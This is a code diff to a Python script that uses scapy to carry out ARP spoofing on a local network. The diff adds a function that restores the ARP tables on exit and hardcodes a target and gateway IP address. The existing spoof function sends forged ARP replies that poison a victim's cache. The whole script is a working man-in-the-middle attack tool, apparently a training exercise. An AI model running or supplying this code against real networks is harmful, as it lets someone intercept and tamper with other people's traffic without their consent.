@@ -2,8 +2,10 @@
 
 import scapy.all as scapy
 import time as t
+#import sys as s
 #import argparse as argp
 
+#def interactive:
 #def get_arguments:
 
 
@@ -13,13 +15,23 @@ def get_mac_addr(ip):
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-    #print(answered_list[0][1].hwsrc)
+    return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac_addr(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
         psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+
+def restore(dst_ip, src_ip):
+    dst_mac = get_mac_addr(dst_ip)
+    src_mac = get_mac_addr(src_ip)
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
+            psrc=src_ip, hwsrc=src_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = "192.168.1.228"
+gateway_ip = "192.168.1.1"
 
 sent_packets_count = 0
 try:
@@ -33,4 +45,7 @@ except KeyboardInterrupt:
     print("")
     print("#####################")
     print("[+] Detected Ctrl + C")
+    print("[+] Resetting ARP Tables of the target IP and the router...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
     print("[!] Quitting...")
